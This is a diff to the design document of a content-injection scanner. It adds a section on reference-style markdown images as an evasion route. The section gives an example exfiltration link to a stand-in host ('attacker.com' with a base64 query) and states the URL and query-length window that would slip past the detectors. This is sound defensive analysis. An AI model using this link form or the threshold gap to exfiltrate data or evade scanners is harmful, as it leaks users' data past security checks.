@@ -171,6 +171,39 @@ relay).
     an MLLM. That threat model requires OCR / visual perception of
     image files and is out of scope for the contentinjection
     primitive package; it would be a separate collector entirely.
+  - **Reference-style markdown images** (`![alt][label]` paired
+    with a `[label]: url` link-reference-definition at any later
+    line): same speculative-evasion framing as HTML `<img>`. The
+    syntax is CommonMark-standard but uncommon in real READMEs;
+    no public exploit documented at time of writing chooses
+    reference form specifically to bypass a scanner.
+
+    **Critically, the cross-primitive coverage means this is
+    NOT a hole even today.** `scanEncodedBlob` walks the whole
+    file's bytes with no regard for markdown structure, so a
+    `[label]: https://attacker.com/?q=<long-base64>` definition
+    fires `PrimitiveEncodedBlob` exactly the way the same URL
+    written inline would — the primitive does not know or care
+    that the bytes happen to live inside a link-reference
+    definition. `scanLexicalInjection`,
+    `scanConfusableMixedScript`, and the rune-family scan are
+    all whole-file-byte detectors with the same property. The
+    only residual window markdown-image-syntax detection of the
+    reference form would close is **URLs between 200 chars
+    (URL-length threshold) and 1024 chars (encoded-blob
+    threshold), or query values between 96 chars (markdown_image
+    query-value threshold) and the encoded-blob threshold —
+    where the URL is long enough to be exfil-shaped by image-
+    context heuristics but too short to trip the byte-level
+    encoded-blob detector**. Whether an attacker would
+    deliberately tune their payload to that narrow window AND
+    choose reference form (rather than inline) for the bypass is
+    the same speculative reach as the HTML-`<img>` argument.
+
+    Deferred for the same reason as the HTML-`<img>` gap:
+    sound-on-paper, undocumented in the wild, and already
+    covered in practice by the byte-level detectors that ignore
+    markdown syntax entirely.
 
 ## The product opportunity
 
